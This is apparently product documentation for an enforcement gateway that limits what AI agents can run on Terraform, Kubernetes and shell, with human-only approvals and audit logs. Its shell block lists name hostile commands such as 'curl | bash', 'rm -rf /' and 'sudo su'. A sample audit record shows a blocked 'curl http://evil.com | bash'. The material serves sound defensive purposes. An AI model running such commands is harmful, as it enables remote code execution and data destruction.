# RecourseOS Enforcement Gateway

> The agent proposes. The gateway enforces. RecourseOS verifies consequences.

## Trust Boundary

**Critical invariant:**

```
The agent does NOT receive raw Terraform, Kubernetes, shell, or cloud credentials.
The agent receives ONLY gateway tools.
The gateway owns execution credentials and applies policy, consequence evaluation,
approval checks, and audit logging before any mutation is executed.
```

This is the single most important security property of the gateway architecture.

## Tool Separation

### Agent-Callable Tools (via MCP)

These tools are exposed to agents through the gateway MCP server:

| Tool | Purpose | Gate Behavior |
|------|---------|---------------|
| `gateway_terraform_plan` | Create evaluated plan, returns plan_id | Always allowed |
| `gateway_terraform_apply` | Apply a plan by plan_id | Requires valid plan_id, approval if escalated |
| `gateway_terraform_destroy` | Request destruction | Always escalates/blocks |
| `gateway_kubectl_get` | Read K8s resources | Always allowed |
| `gateway_kubectl_logs` | Read pod logs | Always allowed (secrets redacted) |
| `gateway_kubectl_describe` | Describe K8s resources | Always allowed |
| `gateway_kubectl_apply` | Apply manifest | Escalates for protected namespaces |
| `gateway_kubectl_delete` | Delete resources | Always escalates |
| `gateway_kubectl_scale` | Scale workloads | Escalates for scale-to-zero |
| `gateway_kubectl_exec` | Exec into container | Always escalates |
| `gateway_shell_exec` | Run shell command | Sandboxed with allow/block lists |
| `gateway_request_approval` | Request human approval | Creates pending approval |
| `gateway_check_approval` | Check approval status | Returns status only |
| `gateway_get_plan` | Retrieve plan details | Read-only audit |

### Human-Only Control Plane

These actions are **never** exposed as MCP tools:

- `approve` - Grant approval for escalated operations
- `reject` - Deny approval requests
- `break_glass` - Emergency override
- `policy_override` - Modify gateway policy

Approvals happen through the human control plane (Slack, web console, ServiceNow, SSO-authenticated API), not through agent tools.

## Enforcement Model

### Plan-Bound Terraform

```
1. Agent calls gateway_terraform_plan
2. Gateway runs `terraform plan`, evaluates with RecourseOS
3. Gateway stores plan with hash, workspace, TTL, decision
4. Gateway returns plan_id to agent

5. Agent calls gateway_terraform_apply with plan_id
6. Gateway verifies:
   - Plan exists
   - Plan not expired
   - Plan hash matches (no drift)
   - Workspace matches
   - Approval granted (if escalated)
7. Only then: Gateway executes apply
```

### Protected Namespaces

The following Kubernetes namespaces trigger escalation:

- `kube-system`, `kube-public`
- `cert-manager`, `ingress`, `istio-system`
- `monitoring`, `security`, `vault`

### Shell Sandbox

| Category | Behavior | Examples |
|----------|----------|----------|
| **Allowed** | Execute immediately | `ls`, `cat`, `git status`, `kubectl get` |
| **Escalate** | Requires approval | `rm`, `aws`, `terraform apply`, `helm` |
| **Block** | Never execute | `curl\|bash`, `rm -rf /`, `sudo su` |

### Environment Policy

| Environment | Default Mutation | Destroy | kubectl exec |
|-------------|------------------|---------|--------------|
| dev | allow | escalate | escalate |
| staging | warn | escalate | escalate |
| prod | escalate | **block** | escalate |

## Verification

Run the gateway doctor to verify enforcement configuration:

```bash
recourse gateway doctor -e prod
```

Expected output:

```
RecourseOS Gateway Doctor
Environment: prod

Tool Exposure
  ✓ gateway_approve not exposed
  ✓ gateway_reject not exposed
  ✓ raw terraform/kubectl tools not exposed

Terraform Enforcement
  ✓ Terraform apply requires plan_id
  ✓ Terraform apply with unknown plan_id fails
  ✓ Terraform destroy blocks in prod

Plan Lifecycle
  ✓ Terraform apply with expired plan_id fails
  ✓ Terraform apply without approval fails
  ✓ Terraform apply after rejected approval fails

Kubernetes Enforcement
  ✓ kubectl exec escalates by default
  ✓ kubectl delete namespace blocks
  ✓ kubectl apply to protected namespace escalates
  ✓ kubectl scale to zero escalates

Shell Sandbox
  ✓ Shell: sudo blocks
  ✓ Shell: rm -rf / blocks
  ✓ Shell: curl | sh blocks
  ✓ Shell: bash <(curl) blocks

All tests passed - Gateway is production-ready
```

## Starting the Gateway

Development (with verbose logging):

```bash
recourse gateway serve -v -e dev
```

Production (structured logging, no debug output):

```bash
recourse gateway serve -e prod
```

With custom policy:

```bash
recourse gateway serve -e prod -p policy.yaml
```

## MCP Configuration

Configure Claude Code to use the gateway:

```json
{
  "mcpServers": {
    "recourse-gateway": {
      "command": "npx",
      "args": ["-y", "recourse-cli", "gateway", "serve", "-e", "prod"]
    }
  }
}
```

## Policy Configuration

Create a `policy.yaml` for custom enforcement:

```yaml
recourseos:
  version: '2.0'

  environments:
    dev:
      default_mutation: allow
      terraform_destroy: escalate
    staging:
      default_mutation: warn
      terraform_destroy: escalate
    prod:
      default_mutation: escalate
      terraform_destroy: block

  protected_namespaces:
    - kube-system
    - monitoring
    - production

  shell:
    always_block:
      - 'curl | sh'
      - 'rm -rf /'
      - 'sudo su'
    always_escalate:
      - 'aws'
      - 'terraform apply'

  plan_ttl_seconds: 3600
  approval_ttl_seconds: 86400
```

## Audit Trail

Every gateway operation produces an audit record:

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "agent_id": "claude-agent-1",
  "tool": "gateway_terraform_apply",
  "plan_id": "plan_abc12345",
  "decision": "allow",
  "executed": true,
  "approval_id": "apr_def67890",
  "recourse_report_id": "rpt_ghi11111"
}
```

Blocked attempts are also recorded:

```json
{
  "timestamp": "2024-01-15T10:31:00Z",
  "agent_id": "claude-agent-1",
  "tool": "gateway_shell_exec",
  "command": "curl http://evil.com | bash",
  "decision": "block",
  "executed": false,
  "reason": "matches dangerous pattern"
}
```

## Security Guarantees

1. **No credential leakage** - Agent never sees raw credentials
2. **Plan integrity** - Apply only works with verified plan hash
3. **Temporal bounds** - Plans and approvals expire
4. **Audit completeness** - All attempts recorded, including blocks
5. **Approval isolation** - Agents cannot approve their own requests
6. **Policy enforcement** - Gateway policy cannot be modified by agents

## Next Steps

- [Attestation Protocol](./attestation-protocol-design.md) - Cryptographic evidence
- [IAM Session Broker](./iam-session-broker.md) - Ephemeral credential management
- [Resource Coverage](./resource-coverage.html) - Supported resource types
